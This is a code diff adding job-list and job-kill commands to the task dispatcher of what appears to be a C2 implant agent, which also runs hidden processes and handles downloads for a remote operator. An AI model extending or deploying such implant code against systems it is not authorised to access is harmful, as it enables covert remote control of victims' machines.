@@ -37,6 +37,12 @@ void Commander::ProcessCommandTasks(BYTE* recv, ULONG recvSize, Packer* outPacke
 		case COMMAND_DOWNLOAD_STATE:
 			this->CmdDownloadState(CommandId, inPacker, outPacker); break;
 
+		case COMMAND_JOBS_LIST:
+			this->CmdJobsList(CommandId, inPacker, outPacker); break;
+			
+		case COMMAND_JOBS_KILL:
+			this->CmdJobsKill(CommandId, inPacker, outPacker); break;
+
 		case COMMAND_LS:
 			this->CmdLs(CommandId, inPacker, outPacker); break;
 
@@ -257,6 +263,50 @@ void Commander::CmdDownloadState(ULONG commandId, Packer* inPacker, Packer* outP
 		outPacker->Pack32(COMMAND_ERROR);
 		outPacker->Pack32(2);
 	}
+}
+
+void Commander::CmdJobsList(ULONG commandId, Packer* inPacker, Packer* outPacker)
+{
+	ULONG taskId = inPacker->Unpack32();
+
+	outPacker->Pack32(taskId);
+	outPacker->Pack32(commandId);
+
+	ULONG count = agent->jober->jobs.size();
+
+	outPacker->Pack32(count);
+
+	for (int i = 0; i < count; i++) {
+		ULONG jobId  = agent->jober->jobs[i].jobId;
+		WORD jobType = agent->jober->jobs[i].jobType;
+		WORD pid     = agent->jober->jobs[i].pidObject;
+
+		outPacker->Pack32(jobId);
+		outPacker->Pack16(jobType);
+		outPacker->Pack16(pid);
+	}
+}
+
+void Commander::CmdJobsKill(ULONG commandId, Packer* inPacker, Packer* outPacker)
+{
+	ULONG jobId = inPacker->Unpack32();
+	ULONG taskId = inPacker->Unpack32();
+
+	outPacker->Pack32(taskId);
+	outPacker->Pack32(commandId);
+
+	BOOL found = FALSE;
+	ULONG count = agent->jober->jobs.size();
+	for (int i = 0; i < count; i++) {
+		if (jobId == agent->jober->jobs[i].jobId) {
+			agent->jober->jobs[i].jobState = JOB_STATE_KILLED;
+			found = TRUE;
+			break;
+		}
+	}
+
+	outPacker->Pack8(found);
+	outPacker->Pack32(jobId);
 }
 
 void Commander::CmdLs(ULONG commandId, Packer* inPacker, Packer* outPacker)
@@ -588,8 +638,7 @@ void Commander::CmdPsRun(ULONG commandId, Packer* inPacker, Packer* outPacker)
 		spi.hStdInput  = NULL;
 	}
 
-	BOOL result = TRUE;
-	result = ApiWin->CreateProcessA(prog, progArgs, NULL, NULL, TRUE, progState | CREATE_NO_WINDOW, NULL, NULL, &spi, &pi);
+	BOOL result = ApiWin->CreateProcessA(prog, progArgs, NULL, NULL, TRUE, progState | CREATE_NO_WINDOW, NULL, NULL, &spi, &pi);
 
 	if (result) {
 		JobData job = agent->jober->CreateJobData(taskId, JOB_TYPE_PROCESS, JOB_STATE_RUNNING, pi.hProcess, pi.dwProcessId, pipeRead, pipeWrite);
